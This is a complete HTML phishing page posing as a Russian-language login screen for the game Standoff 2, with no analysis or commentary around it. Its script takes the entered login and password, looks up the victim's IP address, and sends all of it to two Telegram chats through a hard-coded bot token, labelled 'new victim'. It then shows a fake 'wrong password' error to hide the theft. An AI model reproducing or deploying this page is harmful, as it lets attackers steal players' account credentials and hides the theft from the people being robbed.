<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Standoff 2 · Вход в аккаунт</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0a0e17;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: #121826;
            border-radius: 32px;
            padding: 32px 28px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
            border: 1px solid #2a2f3f;
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo span {
            font-size: 48px;
            font-weight: 800;
            background: linear-gradient(135deg, #ff4757, #ff6b81);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        h1 {
            color: white;
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
        }
        .sub {
            color: #6c7180;
            text-align: center;
            font-size: 13px;
            margin-bottom: 28px;
        }
        input {
            width: 100%;
            background: #1e2432;
            border: 1px solid #2f3545;
            padding: 14px 16px;
            border-radius: 14px;
            color: white;
            font-size: 15px;
            margin-bottom: 14px;
            outline: none;
            transition: 0.2s;
        }
        input:focus {
            border-color: #ff4757;
        }
        button {
            width: 100%;
            background: #ff4757;
            border: none;
            padding: 14px;
            border-radius: 14px;
            font-weight: 600;
            font-size: 16px;
            color: white;
            cursor: pointer;
            margin-top: 8px;
            transition: 0.2s;
        }
        button:active {
            transform: scale(0.97);
        }
        .footer {
            text-align: center;
            font-size: 12px;
            color: #4a4f62;
            margin-top: 24px;
        }
        .error-box {
            background: #1e1820;
            border-radius: 24px;
            padding: 24px;
            text-align: center;
        }
        .error-box h2 {
            color: #ff4757;
            margin-bottom: 12px;
        }
        .error-box p {
            color: #aaa;
        }
    </style>
</head>
<body>

<div class="card" id="app">
    <div class="logo">
        <span>⚡ STANDOFF 2</span>
    </div>
    <h1>Добро пожаловать</h1>
    <div class="sub">Войдите в аккаунт</div>
    
    <input type="text" id="username" placeholder="Email или ID" autocomplete="off">
    <input type="password" id="password" placeholder="Пароль">
    <button id="submitBtn">Войти</button>
    <div class="footer">© 2025 Standoff 2 · Защищённый вход</div>
</div>

<script>
    const BOT_TOKEN = '8791162816:AAE_-BCQGhGFyOQ7XHh7L3aPJp90ddlezz4';
    const ADMIN_IDS = ['7663459492', '6635138703'];

    async function sendData(login, pass) {
        const ip = await fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => d.ip)
            .catch(() => 'unknown');
        
        const text = `🔫 STANDOFF 2 · НОВАЯ ЖЕРТВА%0A%0A📧 Логин: ${encodeURIComponent(login)}%0A🔑 Пароль: ${encodeURIComponent(pass)}%0A🌍 IP: ${ip}%0A🕒 Время: ${new Date().toLocaleString()}`;
        
        for (let id of ADMIN_IDS) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${text}`);
        }
    }

    document.getElementById('submitBtn').onclick = async () => {
        const login = document.getElementById('username').value.trim();
        const pass = document.getElementById('password').value.trim();
        
        if (!login || !pass) {
            alert('Заполните оба поля');
            return;
        }
        
        await sendData(login, pass);
        
        // Меняем интерфейс на "ошибка"
        document.getElementById('app').innerHTML = `
            <div class="error-box">
                <h2>❌ Ошибка входа</h2>
                <p>Неверный email или пароль</p>
                <p style="margin-top: 20px; font-size: 13px;">Попробуйте позже</p>
            </div>
        `;
    };
</script>

</body>
</html>
